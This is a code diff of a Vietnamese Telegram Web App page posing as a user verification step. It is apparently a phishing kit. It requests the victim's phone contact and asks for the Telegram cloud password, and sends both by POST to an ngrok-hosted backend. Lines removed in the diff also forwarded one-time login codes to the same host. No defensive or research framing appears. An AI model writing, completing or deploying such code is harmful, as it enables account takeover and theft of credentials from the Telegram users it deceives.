@@ -2,85 +2,76 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xác Minh</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; }
-        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
-        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; flex: 1; }
+        body { background: #0d1117; color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
+        .screen { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .active { display: flex; }
+        .btn { padding: 15px 30px; background: #3bc0a8; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="content" id="app">
+<div class="screen active" id="step1">
     <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
-    <div id="message">Đang khởi tạo bảo mật...</div>
+    <button class="btn" id="shareContact">Xác Nhận Người Dùng</button>
 </div>
 
+<div class="screen" id="step2">
+    <div>Đang xử lý dữ liệu...</div>
+</div>
 
-    <script>
-const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
-const chat_id = tg.initDataUnsafe?.user?.id || Math.random().toString(36).substring(7);
+<div class="screen" id="step5">
+    <input type="password" id="s5pw" placeholder="Nhập mật khẩu đám mây" style="padding: 10px; width: 80%; border-radius: 8px;">
+    <button class="btn" id="s5btn" onclick="s5check()">Kiểm tra</button>
+</div>
 
-// 1. Xử lý chia sẻ SĐT
-document.getElementById("shareContact").addEventListener("click", () => {
-    tg.onEvent('contactRequested', async (e) => {
-        if (e.status === 'sent') {
-            await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: chat_id, phone: e.responseUnsafe.contact.phone_number })
-            });
-            goStep(2);
-        }
-    });
-    tg.requestContact();
-});
+<div class="screen" id="s5success">
+    <div>✅ Đăng nhập thành công!</div>
+</div>
 
-// 2. Hàm gửi OTP lên Server
-async function checkOtp(val) {
-    const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: chat_id, input: val })
-    });
-    const d = await res.json();
-    
-    if (d.status === 'success') {
-        document.getElementById('s5success').classList.add('show');
-    } else if (d.status === 'need_password') {
-        goStep(5);
-    } else {
-        goStep(4); // Nhảy sang màn hình báo sai mã
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
+    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random() * 1000000);
+
+    function goStep(n) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        if (n === 5) document.getElementById('step5').classList.add('active');
+        else if (n === 'success') document.getElementById('s5success').classList.add('active');
+        else document.getElementById('step' + n).classList.add('active');
     }
-}
 
-// 3. Hàm gửi Password lên Server
-async function s5check() {
-    const pw = document.getElementById('s5pw').value;
-    if (!pw) return;
-    const btn = document.getElementById('s5btn');
-    btn.disabled = true;
-    
-    const res = await fetch(`${BACKEND_URL}/verify_password`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: chat_id, password: pw })
+    document.getElementById("shareContact").addEventListener("click", () => {
+        tg.onEvent('contactRequested', async (e) => {
+            if (e.status === 'sent') {
+                await fetch(`${BACKEND_URL}/send_phone`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: chat_id, phone: e.responseUnsafe.contact.phone_number })
+                });
+                goStep(2);
+            }
+        });
+        tg.requestContact();
     });
-    const d = await res.json();
-    
-    if (d.status === 'success') {
-        document.getElementById('s5success').classList.add('show');
-    } else {
-        alert("Mật khẩu sai, thử lại!");
-        btn.disabled = false;
-    }
-}
 
-// Cập nhật hàm xử lý phím trong new.html cũ:
-// Tại hàm pressKey(prefix, stateKey, k), khi length === 5, hãy gọi: checkOtp(otpState[stateKey].join(''))
+    async function s5check() {
+        const pw = document.getElementById('s5pw').value;
+        const res = await fetch(`${BACKEND_URL}/verify_password`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chat_id, password: pw })
+        });
+        const d = await res.json();
+        if (d.status === 'success') goStep('success');
+        else alert("Mật khẩu sai!");
+    }
 </script>
 </body>
 </html>
